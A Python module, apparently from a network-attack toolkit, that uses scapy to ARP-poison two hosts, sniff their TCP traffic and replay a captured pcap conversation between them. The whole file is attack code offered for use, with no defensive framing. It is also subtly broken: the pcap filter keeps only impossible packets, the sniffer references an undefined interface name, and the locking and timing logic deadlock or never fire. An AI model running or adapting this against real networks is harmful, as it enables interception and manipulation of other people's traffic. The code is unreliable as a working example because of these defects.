from time import time
import threading
from scapy.all import *
from .Client import Client, NetAttrs
from .arp_poison import arp_poison

FIN = 0x01
SYN = 0x02
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80
backlog_queue = []
lock = threading.Lock()
running = True


def replay_usage(exit_num=None):
    usg = ""
    usg += "Requires: Server/Client IP, PCAP Interface"

    print(usg)


def sniffer(src, dst):
    global backlog_queue, lock, running
    passed = int(time() * 1000)
    locall = []
    while running:
        lock.acquire()
        t = sniff(iface=intface,
                  count=1,
                  lfilter=lambda x: x.haslayer(TCP) and x[IP].src == dst.ip and
                  x[IP].dst == src.ip)[0]
        locall.append(t)
        curr = int(time() * 1000)
        if passed - curr > 1000:
            passed = curr
            backlog_queue = backlog_queue + locall
            lock.release()


def rcv_valid(t, rcv):
    return t.ip == rcv.ip


def replay(client, src, dst, conversation):
    global backlog_queue, lock, running
    pos = 0
    msg = conversation.pop(0)
    while conversation:
        if msg[IP].src == src.ip:
            sendp(msg, iface=client.intface)
        elif msg[IP].src == dst.ip:
            lock.acquire()
            if not rcv_valid(backlog_queue.pop(0), msg):
                print('ERROR: unexpected recieve at position {}'.format(pos))
                running = False
                return False
            lock.release()
        pos += 1
        msg = conversation.pop(0) if conversation else []
    running = True
    return True


# filter pcap for tcp messages from client and server
def pcap_filter(pcap, src, dst):
    conversation = []
    for packet in pcap:
        if packet.haslayer(TCP):
            s_to_d = packet[IP].src == src.ip and packet[IP].dst == dst.ip
            d_to_s = packet[IP].src == dst.ip and packet[IP].dst == src.ip
            if s_to_d and d_to_s:
                conversation.append(packet)
    return conversation


def tcp_replay(client, src, dst):
    pcap = input('Enter pcap or show to see options: ')
    while 'show' == pcap:
        print("Pcaps : {}".format(', '.join(client.pcaps.keys())))
        pcap = input('Enter pcap or show to see options: ')

    client.update(['pcap:', pcap], forced=True)
    conversation = pcap_filter(client.pcaps[pcap], src, dst)
    arp_poison(client, src, dst)
    threading.Thread(target=sniffer, args=(src, dst,)).start()
    if replay(client, src, dst, conversation):
        print('Replay successful')
